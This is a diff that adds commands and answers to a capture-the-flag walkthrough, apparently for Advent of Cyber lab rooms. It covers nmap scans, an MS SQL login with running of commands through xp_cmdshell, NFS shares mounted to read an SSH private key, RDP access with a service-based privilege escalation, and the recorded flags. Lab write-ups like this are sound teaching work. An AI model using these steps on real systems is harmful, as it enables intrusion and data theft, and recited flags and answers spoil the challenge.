@@ -361,74 +361,194 @@ Required filters:
 
 ## Offensive Is The Best Defence
 
+```shell
+nmap -sT 10.10.254.185
+#tcp connect scan
+
+sudo nmap -sS 10.10.254.185
+#tcp syn scan
+
+nmap -sV 10.10.254.185
+
+sudo nmap -sS -p- 10.10.254.185
+
+nmap -sV -p 20212 10.10.254.185
+```
+
 ```markdown
-1. How many ports are open between 1 and 100?
+1. How many ports are open between 1 and 100? - 2
 
-2. What is the smallest port number that is open?
+2. What is the smallest port number that is open? - 22
 
-3. What is the service related to the highest port number?
+3. What is the service related to the highest port number? - http
 
-4. Now run nmap -sS MACHINE_IP. Did you get the same results?
+4. Now run nmap -sS MACHINE_IP. Did you get the same results? - Y
 
-5. What is the version number of the web server?
+5. What is the version number of the web server? - Apache httpd 2.4.49
 
-6. What is the CVE number of the vulnerability that was solved in version 2.4.51?
+6. What is the CVE number of the vulnerability that was solved in version 2.4.51? - CVE-2021-42013
 
-7. What is the port number that appeared in the results now?
+7. What is the port number that appeared in the results now? - 20212
 
-8. What is the name of the program listening on the newly discovered port?
+8. What is the name of the program listening on the newly discovered port? - telnetd
 ```
 
 ## Where Are The Reindeers?
 
+```shell
+nmap -T4 -p 1-9999 -Pn 10.10.174.199
+
+sqsh -S 10.10.174.199 -U sa -P t7uLKzddQzVjVFJp
+#sqsh is interactive database shell
+#to communicate with MS SQL server
+
+SELECT * FROM reindeer.dbo.names;
+go
+#SQL query to dump contents
+#go sends SQL batch to database
+#here reindeer is name of database and names is a table
+
+SELECT * FROM reindeer.dbo.schedule;
+go
+
+SELECT * FROM reindeer.dbo.presents;
+go
+
+xp_cmdshell 'whoami';
+go
+#to run MS Windows commands while interacting with server
+
+xp_cmdshell 'dir C:\Users\grinch *.txt /s';
+go
+#to find flag
+
+xp_cmdshell 'type C:\Users\grinch\Documents\flag.txt';
+go
+```
+
 ```markdown
-1. There is an open port related to MS SQL Server accessible over the network. What is the port number?
+1. There is an open port related to MS SQL Server accessible over the network. What is the port number? - 1433
 
-2. What is the prompt that you have received?
+2. What is the prompt that you have received? - 1>
 
-3. What is the first name of the reindeer of id 9?
+3. What is the first name of the reindeer of id 9? - Rudolph
 
-4. What is the destination of the trip scheduled on December 7?
+4. What is the destination of the trip scheduled on December 7? - Prague
 
-5. What is the quantity available for the present "Power Bank"?
+5. What is the quantity available for the present "Power Bank"? - 25000
 
-6. There is a flag hidden in the grinch user's home directory. What are its contents?
+6. There is a flag hidden in the grinch user's home directory. What are its contents? - THM{YjtKeUy2qT3v5dDH}
 ```
 
 ## Sharing Without Caring
 
+```shell
+nmap -T4 -Pn -A 10.10.171.20
+#as Windows hosts block pings by default
+
+showmount -e 10.10.171.20
+#show shares
+
+mkdir tmp1
+
+sudo mount 10.10.171.20:/share tmp1
+#mount the shares
+
+cd tmp1
+
+ls
+
+less 2680-0.txt
+
+cd ..
+
+mkdir tmp2
+
+sudo mount 10.10.171.20:/confidential tmp2
+
+cd tmp2
+
+ls
+
+cd ssh
+
+ls
+
+md5sum id_rsa
+```
+
 ```markdown
-1. How many TCP ports are open?
+1. How many TCP ports are open? - 7
 
-2. Which port is detected by Nmap as NFS or using the mountd service?
+2. Which port is detected by Nmap as NFS or using the mountd service? - 2049
 
-3. How many shares did you find?
+3. How many shares did you find? - 4
 
-4. How many shares show "everyone"?
+4. How many shares show "everyone"? - 3
 
-5. What is the title of file 2680-0.txt?
+5. What is the title of file 2680-0.txt? - Meditations
 
-6. What is the name of the share?
+6. What is the name of the share? - confidential
 
-7. What is the MD5 sum of id_rsa?
+7. What is the MD5 sum of id_rsa? - 3e2d315a38f377f304f5598dc2f044de
 ```
 
 ## They Lost The Plan
 
+```shell
+xfreerdp /u:mcskidy /p:Password1 /v:10.10.7.177
+
+net users
+
+systeminfo
+
+wmic service list
+```
+
 ```markdown
-1. Complete the username?
+We have to follow the given exploitation steps for Iperius Backup Service.
 
-2. What is the OS version?
+Once we have configured everything, start a listener on attacking machine and wait for incoming connection.
+```
 
-3. What backup service did you find running on the system?
+```shell
+whoami
 
-4. What is the path of the executable for the backup service you have identified?
+cd ..
 
-5. What user do you have?
+cd ..
 
-6. What is the content of the flag.txt file?
+dir flag.txt /s
 
-7. Where can we find him at 5:30?
+cd Users
+
+cd thegrinch
+
+dir
+
+cd Documents
+
+dir
+
+type flag.txt
+
+type Schedule.txt
+```
+
+```markdown
+1. Complete the username? - pepper
+
+2. What is the OS version? - 10.0.17763 N/A Build 17763
+
+3. What backup service did you find running on the system? - IperiusSvc
+
+4. What is the path of the executable for the backup service you have identified? - C:\Program Files (x86)\Iperius Backup\IperiusService.exe
+
+5. What user do you have? - the-grinch-hack\thegrinch
+
+6. What is the content of the flag.txt file? - THM-736635221
+
+7. Where can we find him at 5:30? - jazzercize
 ```
 
 ## Dev(Insecure)Ops
